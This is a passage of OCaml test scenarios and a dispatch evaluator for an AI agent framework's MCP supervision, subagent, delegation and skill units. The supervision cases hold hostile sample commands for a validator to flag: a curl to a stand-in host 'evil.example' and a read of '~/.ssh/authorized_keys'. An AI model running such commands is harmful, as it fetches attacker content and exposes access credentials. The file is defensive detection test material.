                    ("default", `Int 0); ("minimum", `Int 0); ("maximum", `Int 100) ] ]);
          ("unit", `String "surface") ] );
    ( "mcp.supervision",
      c
        [ ( "cases",
            `List
              [ c [ ("label", `String "validate_ioc_hit"); ("op", `String "validate_entry"); ("name", `String "srv");
                    ("entry", c [ ("command", `String "curl hermes-0day payload") ]) ];
                c [ ("label", `String "validate_non_shell_interpreter"); ("op", `String "validate_entry");
                    ("name", `String "srv");
                    ("entry", c [ ("command", `String "node"); ("args", `List [ `String "server.js" ]) ]) ];
                c [ ("label", `String "validate_egress_isolated_word"); ("op", `String "validate_entry");
                    ("name", `String "srv");
                    ("entry",
                     c
                       [ ("command", `String "bash");
                         ("args", `List [ `String "-c"; `String "curl http://evil.example/x" ]) ]) ];
                c [ ("label", `String "validate_egress_glued_word_control"); ("op", `String "validate_entry");
                    ("name", `String "srv");
                    ("entry",
                     c
                       [ ("command", `String "bash");
                         ("args", `List [ `String "-c"; `String "mycurl.wrapper http://x" ]) ]) ];
                c [ ("label", `String "validate_persistence_authorized_keys"); ("op", `String "validate_entry");
                    ("name", `String "srv");
                    ("entry",
                     c
                       [ ("command", `String "sh");
                         ("args", `List [ `String "-c"; `String "cat ~/.ssh/authorized_keys" ]) ]) ];
                c [ ("label", `String "command_basename_path"); ("op", `String "command_basename");
                    ("command", `String "/usr/bin/bash") ];
                c [ ("label", `String "is_suspicious_clean"); ("op", `Null); ("name", `String "srv");
                    ("entry", c [ ("command", `String "node") ]) ] ]);
          ("unit", `String "supervision") ] ) ]

let subagent_scenarios : (string * Yojson.Safe.t) list =
  let c fields = `Assoc fields in
  let handle_fields =
    [ ("contract_version", `Int 1); ("subagent_id", `String "sa1"); ("parent_session_id", `Null);
      ("correlation_id", `Null); ("created_at", `Float 1.5); ("provider", `Null); ("model", `Null);
      ("role", `String "leaf"); ("depth", `Int 0); ("capability", `String "x") ]
  in
  [ ( "sub.lifecycle",
      c
        [ ( "cases",
            `List
              [ c [ ("label", `String "handle_round_trip"); ("op", `String "handle_from_dict"); ("value", c handle_fields) ];
                c [ ("label", `String "handle_missing_key"); ("op", `String "handle_from_dict");
                    ("value", c [ ("subagent_id", `String "sa1") ]) ];
                c [ ("label", `String "handle_extra_key"); ("op", `String "handle_from_dict");
                    ("value", c (("extra", `Int 1) :: handle_fields)) ];
                c [ ("label", `String "validate_minimal"); ("op", `String "validate_request"); ("goal", `String "do it");
                    ("context", `Null); ("role", `String "leaf"); ("timeout_seconds", `Null);
                    ("working_directory", `Null); ("blocked_tools", `List []); ("metadata", c []);
                    ("allowed_toolsets", `List []); ("known_toolsets", `List []); ("parent_enabled_toolsets", `Null) ];
                c [ ("label", `String "validate_blank_goal"); ("op", `String "validate_request"); ("goal", `String "   ");
                    ("context", `Null); ("role", `String "leaf"); ("timeout_seconds", `Null);
                    ("working_directory", `Null); ("blocked_tools", `List []); ("metadata", c []);
                    ("allowed_toolsets", `List []); ("known_toolsets", `List []); ("parent_enabled_toolsets", `Null) ];
                c [ ("label", `String "validate_unknown_toolset"); ("op", `String "validate_request"); ("goal", `String "g");
                    ("context", `Null); ("role", `String "leaf"); ("timeout_seconds", `Null);
                    ("working_directory", `Null); ("blocked_tools", `List []); ("metadata", c []);
                    ("allowed_toolsets", `List [ `String "web" ]); ("known_toolsets", `List [ `String "fs" ]);
                    ("parent_enabled_toolsets", `Null) ];
                c [ ("label", `String "validate_broadens_parent"); ("op", `String "validate_request"); ("goal", `String "g");
                    ("context", `Null); ("role", `String "leaf"); ("timeout_seconds", `Null);
                    ("working_directory", `Null); ("blocked_tools", `List []); ("metadata", c []);
                    ("allowed_toolsets", `List [ `String "web" ]); ("known_toolsets", `List [ `String "web" ]);
                    ("parent_enabled_toolsets", `List [ `String "fs" ]) ];
                c [ ("label", `String "validate_rejects_timeout"); ("op", `String "validate_request"); ("goal", `String "g");
                    ("context", `Null); ("role", `String "leaf"); ("timeout_seconds", `Float 5.0);
                    ("working_directory", `Null); ("blocked_tools", `List []); ("metadata", c []);
                    ("allowed_toolsets", `List []); ("known_toolsets", `List []); ("parent_enabled_toolsets", `Null) ];
                c [ ("label", `String "capability_basic"); ("op", `Null); ("secret_hex", `String "2a2a2a2a");
                    ("subagent_id", `String "sa1"); ("parent_session_id", `Null); ("created_at", `Float 1.5) ];
                c [ ("label", `String "capability_none_vs_empty_parent"); ("op", `Null); ("secret_hex", `String "2a2a2a2a");
                    ("subagent_id", `String "sa1"); ("parent_session_id", `String ""); ("created_at", `Float 1.5) ] ]);
          ("unit", `String "lifecycle") ] );
    ( "sub.delegation",
      c
        [ ( "cases",
            `List
              [ c [ ("label", `String "child_prompt_leaf"); ("op", `String "child_prompt"); ("goal", `String "do the thing");
                    ("context", `Null); ("workspace_path", `Null); ("role", `String "leaf"); ("max_spawn_depth", `Int 2);
                    ("child_depth", `Int 1) ];
                c [ ("label", `String "child_prompt_orchestrator_depth_floor"); ("op", `String "child_prompt");
                    ("goal", `String "decompose"); ("context", `String "extra context"); ("workspace_path", `String "/repo");
                    ("role", `String "orchestrator"); ("max_spawn_depth", `Int 2); ("child_depth", `Int 1) ];
                c [ ("label", `String "child_prompt_orchestrator_below_floor"); ("op", `String "child_prompt");
                    ("goal", `String "decompose"); ("context", `Null); ("workspace_path", `Null);
                    ("role", `String "orchestrator"); ("max_spawn_depth", `Int 3); ("child_depth", `Int 0) ];
                c [ ("label", `String "stringify_list_content"); ("op", `String "stringify_content");
                    ("content", `List [ c [ ("type", `String "text"); ("text", `String "hi") ]; `Int 5 ]) ];
                c [ ("label", `String "looks_like_error_json"); ("op", `String "looks_like_error");
                    ("content", `String "{\"status\": \"failed\"}") ];
                c [ ("label", `String "looks_like_error_traceback"); ("op", `String "looks_like_error");
                    ("content", `String "Traceback (most recent call last):\nboom") ];
                c [ ("label", `String "output_tail_basic"); ("op", `String "output_tail");
                    ( "result",
                      c
                        [ ( "messages",
                            `List
                              [ c [ ("role", `String "assistant");
                                    ("tool_calls", `List [ c [ ("id", `String "c1"); ("function", c [ ("name", `String "search") ]) ] ]) ];
                                c [ ("role", `String "tool"); ("tool_call_id", `String "c1"); ("content", `String "result text") ] ] ) ] );
                    ("max_entries", `Int 12); ("max_chars", `Int 8000) ];
                c [ ("label", `String "scrub_env_basic"); ("op", `String "scrub_env");
                    ("env", c [ ("HERMES_KANBAN_TASK", `String "x"); ("OTHER", `String "y") ]) ];
                c [ ("label", `String "normalize_role_unknown"); ("op", `String "normalize_role"); ("role", `String "WEIRD") ];
                c [ ("label", `String "normalized_url_trailing_slashes"); ("op", `String "normalized_url");
                    ("value", `String "http://x///") ];
                c [ ("label", `String "strip_hidden_fields"); ("op", `Null);
                    ("tasks", `List [ c [ ("title", `String "t"); ("acp_command", `String "hide") ] ]) ] ]);
          ("unit", `String "delegation") ] );
    ( "sub.async",
      c
        [ ( "cases",
            `List
              [ c [ ("label", `String "children_activity_2tuple"); ("op", `String "children_activity");
                    ("token", `List [ `List [ `Int 3; `String "grep" ] ]); ("now", `Float 100.0) ];
                c [ ("label", `String "children_activity_3tuple"); ("op", `String "children_activity");
                    ("token", `List [ `List [ `Int 3; `String "grep"; `Float 90.25 ] ]); ("now", `Float 100.0) ];
                c [ ("label", `String "children_activity_not_iterable"); ("op", `String "children_activity");
                    ("token", `Null); ("now", `Float 1.0) ];
                c [ ("label", `String "one_line_falsy_zero"); ("op", `String "one_line"); ("text", `Int 0); ("limit", `Int 10) ];
                c [ ("label", `String "one_line_collapses_ws"); ("op", `String "one_line"); ("text", `String "a   b\nc");
                    ("limit", `Int 10) ];
                c [ ("label", `String "one_line_truncates"); ("op", `String "one_line"); ("text", `String "abcdefgh"); ("limit", `Int 6) ];
                c [ ("label", `String "matches_selectors_hit"); ("op", `Null); ("record", c [ ("session_key", `String "k1") ]);
                    ("session_key", `String "k1"); ("origin_ui_session_id", `String ""); ("parent_session_id", `String "") ];
                c [ ("label", `String "matches_selectors_all_default"); ("op", `Null); ("record", c []); ("session_key", `String "");
                    ("origin_ui_session_id", `String ""); ("parent_session_id", `String "") ] ]);
          ("unit", `String "async") ] );
    ( "sub.moa",
      c
        [ ( "cases",
            `List
              [ c [ ("label", `String "peel_shape_c_own_message"); ("op", `String "peel_guidance");
                    ("guidance", `String "g"); ("messages", `List [ c [ ("role", `String "user"); ("content", `String "g") ] ]) ];
                c [ ("label", `String "peel_shape_a_merged_string"); ("op", `String "peel_guidance"); ("guidance", `String "g");
                    ("messages", `List [ c [ ("role", `String "user"); ("content", `String "base\n\ng") ] ]) ];
                c [ ("label", `String "flatten_skips_non_text"); ("op", `String "flatten_text");
                    ("content", `List [ c [ ("type", `String "text"); ("text", `String "hi") ]; c [ ("type", `String "image_url") ] ]) ];
                c [ ("label", `String "render_calls_with_args"); ("op", `String "render_calls");
                    ("tool_calls", `List [ c [ ("function", c [ ("name", `String "search"); ("arguments", c [ ("q", `String "x") ]) ]) ] ]) ];
                c [ ("label", `String "truncate_short_passthrough"); ("op", `String "truncate_result"); ("text", `String "short");
                    ("budget", `Int 100) ];
                c [ ("label", `String "truncate_over_budget"); ("op", `String "truncate_result");
                    ("text", `String "0123456789abcdefghij"); ("budget", `Int 10) ];
                c [ ("label", `String "reference_messages_lone_user"); ("op", `String "reference_messages");
                    ("messages", `List [ c [ ("role", `String "user"); ("content", `String "hello") ] ]) ];
                c [ ("label", `String "reference_messages_tool_after_assistant"); ("op", `String "reference_messages");
                    ("messages",
                     `List
                       [ c [ ("role", `String "user"); ("content", `String "run it") ];
                         c [ ("role", `String "assistant"); ("content", `String "on it"); ("tool_calls", `Null) ];
                         c [ ("role", `String "tool"); ("content", `String "output here") ] ]) ];
                c [ ("label", `String "is_failed_case_insensitive"); ("op", `String "is_failed"); ("text", `String "[FAILED: timeout]") ];
                c [ ("label", `String "successful_refs_filters"); ("op", `String "successful_refs");
                    ("reference_outputs",
                     `List [ `List [ `String "a"; `String "ok text"; `Null ]; `List [ `String "b"; `String "[failed: x]"; `Null ] ]) ];
                c [ ("label", `String "failed_labels_order"); ("op", `String "failed_labels");
                    ("reference_outputs",
                     `List [ `List [ `String "a"; `String "[failed: x]"; `Null ]; `List [ `String "b"; `String "[skipped: y]"; `Null ] ]) ];
                c [ ("label", `String "degraded_notice_silent_policy"); ("op", `String "degraded_notice");
                    ("failed_labels", `List [ `String "a" ]); ("policy", `String "SILENT") ];
                c [ ("label", `String "preset_temp_explicit_zero"); ("op", `String "preset_temp");
                    ("preset", c [ ("t", `Int 0) ]); ("key", `String "t") ];
                c [ ("label", `String "preset_temp_absent"); ("op", `String "preset_temp"); ("preset", c []); ("key", `String "t") ];
                c [ ("label", `String "slot_label_with_reasoning"); ("op", `String "slot_label");
                    ("slot", c [ ("provider", `String " openai "); ("model", `String " gpt "); ("reasoning_effort", `String "high") ]) ];
                c [ ("label", `String "sanitize_session_id_basic"); ("op", `String "sanitize_session"); ("session_id", `String "a b!") ];
                c [ ("label", `String "merge_extra_body_caller_wins"); ("op", `Null);
                    ("slot_extra_body", c [ ("a", `Int 1) ]); ("caller_extra_body", c [ ("a", `Int 2); ("b", `Int 3) ]) ] ]);
          ("unit", `String "moa") ] );
    ( "sub.kanban",
      c
        [ ( "cases",
            `List
              [ c [ ("label", `String "parse_worker_full"); ("op", `String "parse_worker");
                    ("raw", `String "researcher:Find bugs:python,testing") ];
                c [ ("label", `String "parse_worker_stray_colon"); ("op", `String "parse_worker"); ("raw", `String "a:b:c:d") ];
                c [ ("label", `String "parse_worker_too_few"); ("op", `String "parse_worker"); ("raw", `String "solo") ];
                c [ ("label", `String "require_text_blank"); ("op", `String "require_text"); ("value", `String "  ");
                    ("field_name", `String "goal") ];
                c [ ("label", `String "swarm_context_basic"); ("op", `String "swarm_context"); ("root_id", `String "r1");
                    ("goal", `String " g ") ];
                c [ ("label", `String "parse_bool_yes"); ("op", `String "parse_bool"); ("args", c [ ("x", `String "YES") ]);
                    ("name", `String "x"); ("default", `Bool false) ];
                c [ ("label", `String "parse_bool_int_one"); ("op", `String "parse_bool"); ("args", c [ ("x", `Int 1) ]);
                    ("name", `String "x"); ("default", `Bool false) ];
                c [ ("label", `String "parse_bool_float_one_control"); ("op", `String "parse_bool");
                    ("args", c [ ("x", `Float 1.0) ]); ("name", `String "x"); ("default", `Bool false) ];
                c [ ("label", `String "ok_envelope_basic"); ("op", `String "ok_envelope");
                    ("fields", `List [ `List [ `String "count"; `Int 3 ] ]) ];
                c [ ("label", `String "normalize_profile_none_sentinel"); ("op", `Null); ("value", `String "none") ];
                c [ ("label", `String "normalize_profile_real_value"); ("op", `Null); ("value", `String "alice") ] ]);
          ("unit", `String "kanban") ] ) ]

(* One evaluator for every slice unit above -- dispatch on the scenario's
   declared unit, one case in, one labeled result out. Fail-closed: an
   unreadable case is None and the caller refuses the whole scenario. *)
let slice_case unit_id fields =
  let str name = match List.assoc_opt name fields with Some (`String v) -> Some v | _ -> None in
  match (unit_id, List.assoc_opt "label" fields) with
  | "frontmatter_strip", Some (`String label) ->
      Option.map
        (fun content -> (label, `String (Prompt_units.strip_yaml_frontmatter content)))
        (str "content")
  | "steer_marker", Some (`String label) ->
      Option.map (fun text -> (label, `String (Prompt_units.format_steer_marker text))) (str "text")
  | "context_file_budget", Some (`String label) -> (
      match List.assoc_opt "context_length" fields with
      | Some `Null ->
          Some (label, `Int (Prompt_units.dynamic_context_file_max_chars None))
      | Some (`Int length) ->
          Some (label, `Int (Prompt_units.dynamic_context_file_max_chars (Some length)))
      | _ -> None)
  | "reference_parse", Some (`String label) ->
      Option.map
        (fun message ->
          let refs = Context_units.parse_context_references message in
          let opt = function None -> `Null | Some n -> `Int n in
          ( label,
            `List
              (List.map
                 (fun (r : Context_units.reference) ->
                   `Assoc
                     [ ("raw", `String r.raw); ("kind", `String r.kind);
                       ("target", `String r.target); ("start", `Int r.start);
                       ("end", `Int r.finish); ("line_start", opt r.line_start);
                       ("line_end", opt r.line_end) ])
                 refs) ))
        (str "message")
  | "reference_quote", Some (`String label) ->
      Option.map
        (fun value -> (label, `String (Context_units.format_reference_value value)))
        (str "value")
  | "skill_markers", Some (`String label) -> (
      match str "op" with
      | Some "marker" ->
          Option.map
            (fun name -> (label, `String (Compress_units.skill_pruned_marker name)))
            (str "name")
      | Some "extract" ->
          Option.map
            (fun text ->
              ( label,
                `List
                  (List.map
                     (fun name -> `String name)
                     (Compress_units.extract_pruned_skill_names text)) ))
            (str "text")
      | Some "reinject" -> (
          match (str "summary", List.assoc_opt "names" fields) with
          | Some summary, Some (`List names) ->
              let names =
                List.filter_map (function `String n -> Some n | _ -> None) names
              in
              Some
                (label, `String (Compress_units.reinject_pruned_skill_markers summary names))
          | _ -> None)
      | _ -> None)
  | "pure_tail", Some (`String label) ->
      Option.map
        (fun message -> (label, `Bool (Finalize_units.is_pure_tool_call_tail message)))
        (List.assoc_opt "message" fields)
  | "scaffolding", Some (`String label) -> (
      match List.assoc_opt "messages" fields with
      | Some (`List messages) ->
          Some
            ( label,
              `List (Finalize_units.drop_verification_continuation_scaffolding messages) )
      | _ -> None)
  | "registry", Some (`String label) -> (
      match str "op" with
      | Some "estimate" -> (
          match List.assoc_opt "tool_defs" fields with
          | Some (`List tool_defs) ->
              Some (label, `Int (Tool_units.estimate_tokens_from_schemas tool_defs))
          | _ -> None)
      | Some "activate" -> (
          match (str "enabled", List.assoc_opt "deferrable_tokens" fields) with
          | Some enabled, Some (`Int deferrable_tokens) ->
              Some (label, `Bool (Tool_units.should_activate ~enabled ~deferrable_tokens))
          | _ -> None)
      | Some "budget" -> (
          match
            ( List.assoc_opt "threshold_pct" fields,
              List.assoc_opt "listing_max_tokens" fields,
              List.assoc_opt "context_length" fields )
          with
          | Some (`Float threshold_pct), Some (`Int listing_max_tokens), Some context ->
              let context_length = match context with `Int n -> Some n | _ -> None in
              Some
                ( label,
                  `Int
                    (Tool_units.listing_token_budget ~threshold_pct ~listing_max_tokens
                       ~context_length) )
          | _ -> None)
      | _ -> None)
  | "destructive", Some (`String label) ->
      Option.map (fun cmd -> (label, `Bool (Tool_units.is_destructive_command cmd))) (str "cmd")
  | "approval_normalize", Some (`String label) -> (
      match List.assoc_opt "value" fields with
      | Some value -> Some (label, `Bool (Tool_units.normalize_enabled value))
      | None -> None)
  | "patch_parse", Some (`String label) ->
      Option.map
        (fun patch ->
          let operations, error = Tool_units.parse_v4a_patch patch in
          ( label,
            `Assoc
              [ ("operations", `List (List.map Tool_units.operation_to_json operations));
                ("error", match error with None -> `Null | Some e -> `String e) ] ))
        (str "patch")
  | "result", Some (`String label) -> (
      match str "op" with
      | Some "canonical" -> (
          match List.assoc_opt "args" fields with
          | Some args -> (
              match Tool_units.canonical_tool_args args with
              | Ok canonical -> Some (label, `String canonical)
              | Error _ -> None)
          | None -> None)
      | Some "classify" -> (
          match (str "tool_name", List.assoc_opt "result" fields) with
          | Some tool_name, Some (`String result) ->
              let failed, suffix =
                Tool_units.classify_tool_failure ~tool_name ~result:(Some result)
              in
              Some (label, `List [ `Bool failed; `String suffix ])
          | Some tool_name, Some `Null ->
              let failed, suffix = Tool_units.classify_tool_failure ~tool_name ~result:None in
              Some (label, `List [ `Bool failed; `String suffix ])
          | _ -> None)
      | Some "landed" -> (
          match (str "tool_name", str "result") with
          | Some tool_name, Some result ->
              Some (label, `Bool (Tool_units.file_mutation_result_landed ~tool_name ~result))
          | _ -> None)
      | _ -> None)
  | "sensitive_text", Some (`String label) -> (
      match (str "text", List.assoc_opt "redact_url_credentials" fields) with
      | Some text, Some (`Bool redact_url_credentials) ->
          Some
            (label, `String (Redact_units.redact_sensitive_text ~redact_url_credentials text))
      | _ -> None)
  | "coding_context", Some (`String label) -> (
      match str "op" with
      | Some "family" ->
          Option.map
            (fun model ->
              ( label,
                match Context_file_units.model_family model with
                | None -> `Null
                | Some f -> `String f ))
            (str "model")
      | Some "line" ->
          Option.map
            (fun model -> (label, `String (Context_file_units.edit_format_line model)))
            (str "model")
      | Some "profile" -> (
          match (str "mode", str "platform") with
          | Some mode, Some platform ->
              Some
                ( label,
                  match Context_file_units.detect_profile_name_pure ~mode ~platform with
                  | None -> `Null
                  | Some p -> `String p )
          | _ -> None)
      | _ -> None)
  | "ancestor", Some (`String label) -> (
      match (str "a", str "b") with
      | Some a, Some b -> Some (label, `Bool (Context_file_units.is_ancestor_or_same a b))
      | _ -> None)
  | "breakdown", Some (`String label) -> (
      match str "op" with
      | Some "chars" ->
          Option.map (fun t -> (label, `Int (Context_file_units.chars_to_tokens t))) (str "text")
      | Some "bytes" -> (
          match List.assoc_opt "size" fields with
          | Some `Null -> Some (label, `Null)
          | Some (`Int size) -> (
              match Context_file_units.bytes_to_tokens (Some size) with
              | Some n -> Some (label, `Int n)
              | None -> Some (label, `Null))
          | _ -> None)
      | Some "json" ->
          Option.map
            (fun v -> (label, `Int (Context_file_units.json_tokens v)))
            (List.assoc_opt "value" fields)
      | Some "split" -> (
          match List.assoc_opt "tools" fields with
          | Some (`List tools) ->
              let b, m, s = Context_file_units.split_tools tools in
              Some (label, `List [ `Int b; `Int m; `Int s ])
          | _ -> None)
      | _ -> None)
  | "cwd_placeholder", Some (`String label) -> (
      match
        ( str "configured_cwd", str "terminal_backend",
          List.assoc_opt "messaging_cwd" fields,
          List.assoc_opt "docker_mount_cwd_to_workspace" fields, str "home_fallback" )
      with
      | Some configured_cwd, Some terminal_backend, Some msg, Some (`Bool mount),
        Some home_fallback ->
          let messaging_cwd = match msg with `String s -> Some s | _ -> None in
          Some
            ( label,
              match
                Context_file_units.resolve_placeholder_terminal_cwd ~configured_cwd
                  ~terminal_backend ~messaging_cwd ~docker_mount_cwd_to_workspace:mount
                  ~home_fallback
              with
              | None -> `Null
              | Some s -> `String s )
      | _ -> None)
  | "manager", Some (`String label) -> (
      match str "op" with
      | Some "normalize" -> (
          match List.assoc_opt "schema" fields with
          | Some schema ->
              Some
                ( label,
                  match Memory_units.normalize_tool_schema schema with
                  | None -> `Null
                  | Some s -> s )
          | None -> None)
      | Some "enabled" -> (
          match List.assoc_opt "memory_tool_present" fields with
          | Some (`Bool memory_tool_present) ->
              let list_opt name =
                match List.assoc_opt name fields with
                | Some (`List xs) ->
                    Some (List.filter_map (function `String s -> Some s | _ -> None) xs)
                | _ -> None
              in
              Some
                ( label,
                  `Bool
                    (Memory_units.memory_provider_tools_enabled
                       ~enabled_toolsets:(list_opt "enabled_toolsets")
                       ~disabled_toolsets:(list_opt "disabled_toolsets") ~memory_tool_present) )
          | _ -> None)
      | Some "sanitize" ->
          Option.map (fun t -> (label, `String (Memory_units.sanitize_context t))) (str "text")
      | Some "block" ->
          Option.map
            (fun t -> (label, `String (Memory_units.build_memory_context_block t)))
            (str "text")
      | _ -> None)
  | "trivial", Some (`String label) ->
      let text = match List.assoc_opt "text" fields with Some (`String t) -> Some t | _ -> None in
      Some (label, `Bool (Memory_units.is_trivial_prompt text))
  | "session_state", Some (`String label) -> (
      let opt_str name =
        match List.assoc_opt name fields with Some (`String s) -> Some s | _ -> None
      in
      match str "op" with
      | Some "hash" ->
          Option.map (fun t -> (label, `String (Memory_units.system_prompt_hash t))) (str "text")
      | Some "workspace_key" ->
          Some
            ( label,
              match
                Memory_units.workspace_key ~git_repo_root:(opt_str "git_repo_root")
                  ~cwd:(opt_str "cwd")
              with
              | None -> `Null
              | Some k -> `String k )
      | Some "cwd_clause" ->
          Option.map
            (fun prefix ->
              let clause, params = Memory_units.cwd_prefix_clause prefix in
              (label, `List [ `String clause; `List (List.map (fun p -> `String p) params) ]))
            (str "cwd_prefix")
      | Some "workspace_clause" ->
          Option.map
            (fun key ->
              let clause, params = Memory_units.workspace_key_clause key in
              (label, `List [ `String clause; `List (List.map (fun p -> `String p) params) ]))
            (str "key")
      | _ -> None)
  | "portability", Some (`String label) -> (
      let result_json = function
        | Ok None -> `Assoc [ ("ok", `Bool true); ("value", `Null) ]
        | Ok (Some v) -> `Assoc [ ("ok", `Bool true); ("value", v) ]
        | Error e -> `Assoc [ ("ok", `Bool false); ("error", `String e) ]
      in
      let value = Option.value (List.assoc_opt "value" fields) ~default:`Null in
      match str "op" with
      | Some "text_or_none" ->
          Some
            ( label,
              result_json (Result.map (function None -> None | Some s -> Some (`String s))
                              (Memory_units.import_text_or_none ~field:"value" value)) )
      | Some "json_object_or_none" ->
          Some
            ( label,
              result_json (Result.map (function None -> None | Some s -> Some (`String s))
                              (Memory_units.import_json_object_or_none ~field:"value" value)) )
      | Some "float_or_none" ->
          Some
            ( label,
              match Memory_units.float_or_none value with
              | None -> `Null
              | Some f -> `Float f )
      | Some "int_or_none" ->
          Some
            ( label,
              result_json (Result.map (function None -> None | Some n -> Some (`Int n))
                              (Memory_units.import_int_or_none ~field:"value" value)) )
      | Some "int_or_default" -> (
          match List.assoc_opt "default" fields with
          | Some (`Int default) ->
              Some (label, `Int (Memory_units.int_or_default ~default value))
          | _ -> None)
      | Some "reasoning_json_value" -> Some (label, Memory_units.reasoning_json_value value)
      | _ -> None)
  | "discovery", Some (`String label) -> (
      let frontmatter = Option.value (List.assoc_opt "frontmatter" fields) ~default:(`Assoc []) in
      match str "op" with
      | Some "prereqs" ->
          let env_vars, commands = Skill_units.collect_prerequisite_values frontmatter in
          Some
            ( label,
              `Assoc
                [ ("env_vars", `List (List.map (fun s -> `String s) env_vars));
                  ("commands", `List (List.map (fun s -> `String s) commands)) ] )
      | Some "required_env" ->
          Some
            (label, `List (Skill_units.get_required_environment_variables ~frontmatter ~legacy_env_vars:None))
      | Some "tags" ->
          Option.map
            (fun v -> (label, `List (List.map (fun s -> `String s) (Skill_units.parse_tags v))))
            (List.assoc_opt "value" fields)
      | Some "sort" -> (
          match List.assoc_opt "skills" fields with
          | Some (`List skills) -> Some (label, `List (Skill_units.sort_skills skills))
          | _ -> None)
      | Some "path_error" ->
          Option.map
            (fun name ->
              (label, match Skill_units.skill_lookup_path_error name with None -> `Null | Some e -> `String e))
            (str "name")
      | _ -> None)
  | "bundles", Some (`String label) ->
      Option.map (fun name -> (label, `String (Skill_units.slugify name))) (str "name")
  | "preprocessing", Some (`String label) -> (
      let frontmatter = Option.value (List.assoc_opt "frontmatter" fields) ~default:(`Assoc []) in
      match str "op" with
      | Some "template" -> (
          match (str "content", List.assoc_opt "skill_dir" fields, List.assoc_opt "session_id" fields) with
          | Some content, Some skill_dir, Some session_id ->
              let opt = function `String s -> Some s | _ -> None in
              Some
                ( label,
                  `String
                    (Skill_units.substitute_template_vars ~content ~skill_dir:(opt skill_dir)
                       ~session_id:(opt session_id)) )
          | _ -> None)
      | Some "platform" -> (
          match (str "current", List.assoc_opt "running_in_termux" fields) with
          | Some current, Some (`Bool running_in_termux) ->
              let platforms = Option.value (List.assoc_opt "platforms" fields) ~default:`Null in
              Some
                ( label,
                  `Bool (Skill_units.skill_matches_platform_list ~current ~running_in_termux platforms) )
          | _ -> None)
      | Some "config_vars" -> Some (label, `List (Skill_units.extract_skill_config_vars frontmatter))
      | Some "description" ->
          Some
            ( label,
              `Assoc
                [ ("description", `String (Skill_units.extract_skill_description frontmatter));
                  ("truncated", `Bool (Skill_units.is_skill_description_truncated_for_prompt frontmatter))
                ] )
      | _ -> None)
  | "sync", Some (`String label) -> (
      match str "op" with
      | Some "canonical" ->
          Option.map (fun obj -> (label, `String (Skill_units.canonical_json_bytes obj)))
            (List.assoc_opt "obj" fields)
      | Some "merge" ->
          let opt name = match List.assoc_opt name fields with Some (`String s) -> Some s | _ -> None in
          Some
            ( label,
              `String (Skill_units.merge_skill ~base:(opt "base") ~ours:(opt "ours") ~theirs:(opt "theirs")) )
      | Some "wire" -> Option.map (fun data -> (label, `String (Skill_units.wire_address data))) (str "data")
      | Some "tracked" -> (
          match (str "origin_hash", str "user_hash") with
          | Some origin_hash, Some user_hash ->
              Some (label, `Bool (Skill_units.is_tracked_user_modification ~origin_hash ~user_hash))
          | _ -> None)
      | Some "bool" ->
          Option.map
            (fun v -> (label, match Skill_units.parse_bool v with None -> `Null | Some b -> `Bool b))
            (List.assoc_opt "value" fields)
      | Some "manifest_build" -> (
          match List.assoc_opt "skills" fields with
          | Some (`Assoc entries) ->
              let skills =
                List.filter_map
                  (fun (name, v) -> match v with `Bool b -> Some (name, b) | _ -> None)
                  entries
              in
              Some (label, `String (Skill_units.build_sync_manifest_bytes skills))
          | _ -> None)
      | Some "manifest_parse" ->
          Option.map
            (fun data ->
              ( label,
                match Skill_units.parse_sync_manifest data with
                | None -> `Null
                | Some skills ->
                    `List
                      (List.map (fun (n, e) -> `Assoc [ ("name", `String n); ("enabled", `Bool e) ]) skills)
              ))
            (str "data")
      | _ -> None)
  | "provenance", Some (`String label) -> (
      match str "op" with
      | Some "install" -> (
          match
            ( str "trust_level", str "verdict", List.assoc_opt "findings_count" fields,
              List.assoc_opt "force" fields )
          with
          | Some trust_level, Some verdict, Some (`Int findings_count), Some (`Bool force) ->
              let allowed, reason =
                Skill_units.should_allow_install ~trust_level ~verdict ~findings_count ~force
              in
              let allowed_json =
                match allowed with `Allowed -> `Bool true | `Blocked -> `Bool false | `NeedsConfirmation -> `Null
              in
              Some (label, `Assoc [ ("allowed", allowed_json); ("reason", `String reason) ])
          | _ -> None)
      | Some "verdict" -> (
          match List.assoc_opt "severities" fields with
          | Some (`List sevs) ->
              let severities = List.filter_map (function `String s -> Some s | _ -> None) sevs in
              Some (label, `String (Skill_units.determine_verdict severities))
          | _ -> None)
      | Some "trust" -> Option.map (fun s -> (label, `String (Skill_units.resolve_trust_level s))) (str "source")
      | Some "report" -> (
          match
            ( str "skill_name", str "source", str "trust_level", str "verdict",
              List.assoc_opt "findings" fields )
          with
          | Some skill_name, Some source, Some trust_level, Some verdict, Some (`List findings) ->
              (* The frozen format_scan_report has no force parameter -- it
                 always calls should_allow_install(result) at the default
                 force=False. Hardcoded here to match, not read from the
                 scenario (a force field would be inert and misleading). *)
              Some
                ( label,
                  `String
                    (Skill_units.format_scan_report ~skill_name ~source ~trust_level ~verdict ~findings
                       ~force:false) )
          | _ -> None)
      | Some "summary" -> (
          match (str "name", str "verdict", List.assoc_opt "categories" fields) with
          | Some name, Some verdict, Some (`List cats) ->
              let categories = List.filter_map (function `String s -> Some s | _ -> None) cats in
              Some (label, `String (Skill_units.build_summary ~name ~verdict ~categories))
          | _ -> None)
      | Some "ast_report" -> (
          match (str "skill_name", List.assoc_opt "findings" fields) with
          | Some skill_name, Some (`List findings) ->
              let parsed =
                List.filter_map
                  (function
                    | `List [ `String f; `Int l; `String p; `String d ] -> Some (f, l, p, d)
                    | _ -> None)
                  findings
              in
              if List.length parsed <> List.length findings then None
              else Some (label, `String (Skill_units.format_ast_report ~skill_name parsed))
          | _ -> None)
      | _ -> None)
  | "repl", Some (`String label) -> (
      match str "op" with
      | Some "strip_ansi" ->
          Option.map (fun text -> (label, `String (Interactive_cli_units.strip_ansi text))) (str "text")
      | Some "is_status_footer_rule" ->
          Option.map (fun line -> (label, `Bool (Interactive_cli_units.is_status_footer_rule line))) (str "line")
      | Some "strip_console_status_footer" ->
          Option.map
            (fun text -> (label, `String (Interactive_cli_units.strip_console_status_footer text)))
            (str "text")
      | Some "format_sessions" -> (
          match List.assoc_opt "sessions" fields with
          | Some (`List sessions) -> Some (label, `String (Interactive_cli_units.format_sessions sessions))
          | _ -> None)
      | Some "clean_summary" ->
          let text = match List.assoc_opt "text" fields with Some (`String s) -> Some s | _ -> None in
          Some (label, `String (Interactive_cli_units.clean_summary text))
      | Some "auto_provider_name" ->
          Option.map
            (fun base_url -> (label, `String (Interactive_cli_units.auto_provider_name base_url)))
            (str "base_url")
      | Some "parse_dashboard_runtime" ->
          Option.map
            (fun command ->
              ( label,
                match Interactive_cli_units.parse_dashboard_runtime command with
                | None -> `Null
